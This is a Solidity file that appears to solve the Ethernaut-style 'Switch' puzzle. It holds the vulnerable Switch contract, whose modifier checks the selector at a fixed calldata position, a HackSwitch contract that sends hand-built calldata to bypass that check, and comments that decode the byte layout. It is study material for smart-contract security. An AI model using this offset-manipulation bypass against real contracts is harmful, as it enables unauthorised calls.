// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TestHack {
    bytes public showData;
    bytes4 public selectorOf;
    bytes4 public functionToCall;
    bytes public callData;
    bytes public showData2;

    function test() external {
        // bytes4 selector = bytes4(keccak256("flipSwitch(bytes))"));
        // bytes memory data2 = abi.encodeWithSelector(selector, address(this));
        // showData2 = data2;

        functionToCall = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 selectorOn = bytes4(keccak256("turnSwitchOn()"));
        uint256 offset = 0x60;
        selectorOf = bytes4(keccak256("turnSwitchOff()"));
        bool empty = false;
        bytes memory data = abi.encode(functionToCall, offset, empty, selectorOf, empty, selectorOn);
        callData =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        showData = data;
    }
}

// Calldata layout ->
// 30c13ade -> function selector for flipSwitch(bytes memory data)

// 0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field
// 0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
// 20606e1500000000000000000000000000000000000000000000000000000000 -> bytes4(keccak256("turnSwitchOff()"))
// 0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
// 76227e1200000000000000000000000000000000000000000000000000000000 -> functin selector for turnSwitchOn()

// 0x
// 30c13ade00000000000000000000000000000000000000000000000000000000                       MINE
// 0000000000000000000000000000000000000000000000000000000000000060
// 0000000000000000000000000000000000000000000000000000000000000000
// 20606e1500000000000000000000000000000000000000000000000000000000
// 0000000000000000000000000000000000000000000000000000000000000000
// 76227e1200000000000000000000000000000000000000000000000000000000

// 0x
// 30c13ade
// 0000000000000000000000000000000000000000000000000000000000000060                        ACTUAL
// 0000000000000000000000000000000000000000000000000000000000000000
// 20606e1500000000000000000000000000000000000000000000000000000000
// 0000000000000000000000000000000000000000000000000000000000000004
// 76227e1200000000000000000000000000000000000000000000000000000000

contract HackSwitch {
    Switch public immutable switcher;
    bytes callData;
    bytes data;

    constructor(address _switch) {
        switcher = Switch(_switch);
    }

    function attack() external {
        bytes4 functionToCall = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 selectorOn = bytes4(keccak256("turnSwitchOn()"));
        bytes4 selectorOff = bytes4(keccak256("turnSwitchOff()"));
        //0x20 if the dynamic argument is the first argument.
        // 0x40 if there's one static argument before the dynamic argument.
        // 0x60 if there are two static arguments before the dynamic argument or complex encoding that includes additional placeholders or data sections before the dynamic data.
        uint256 offset = 0x60;
        uint256 argLength;
        bool empty = false;
        data = abi.encode(functionToCall, offset, empty, selectorOff, argLength, selectorOn);

        //switcher.flipSwitch(data);
        callData =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool success,) = address(switcher).call(callData);

        require(success, "Call failed!");
        require(switcher.switchOn() == true, "Couldn't turn switch of");
    }
}

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
